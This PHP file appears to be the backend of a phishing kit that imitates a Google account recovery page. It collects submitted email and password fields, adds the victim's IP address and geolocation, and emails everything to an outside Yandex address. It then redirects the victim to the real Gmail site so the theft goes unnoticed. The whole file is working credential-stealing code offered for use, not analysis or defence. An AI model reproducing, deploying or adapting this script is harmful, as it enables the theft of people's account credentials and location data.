﻿<?php

require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$phoneNumber = $_POST['phoneNumber'];
$recEmail    = $_POST['recEmail'];
$ip = getenv("REMOTE_ADDR");
$subj = "‎Rec0very Detailz $ip ";
$msg .= "--------------------------------------------\n";
$msg .= "Email         : ".$_POST['phoneNumber']."\n";
$msg .= "Password      : ".$_POST['recEmail']."\n";
$msg .= "IP: ".$ip.      "\n";
$msg .= "City: {$geoplugin->city}\n";
$msg .= "Region: {$geoplugin->region}\n";
$msg .= "Country Name: {$geoplugin->countryName}\n";
$msg .= "Country Code: {$geoplugin->countryCode}\n";
$msg .= "Date: ".$adddate."\n";
$msg .= "--------------------------------------------\n";

if (($phoneNumber==NULL)){

echo "<script>location.replace('Sign in - Google Accounts.htm');</script>";
exit;
}

if (($recEmail==NULL)){

echo "<script>location.replace('Sign in - Google Accounts.htm');</script>";
exit;
}

else {

mail("robinsondreck@yandex.com", $subj, $msg);

echo "<script language=javascript>
alert('Connecting please wait');
window.location='https://gmail.com/';
</script>";
    
}

?>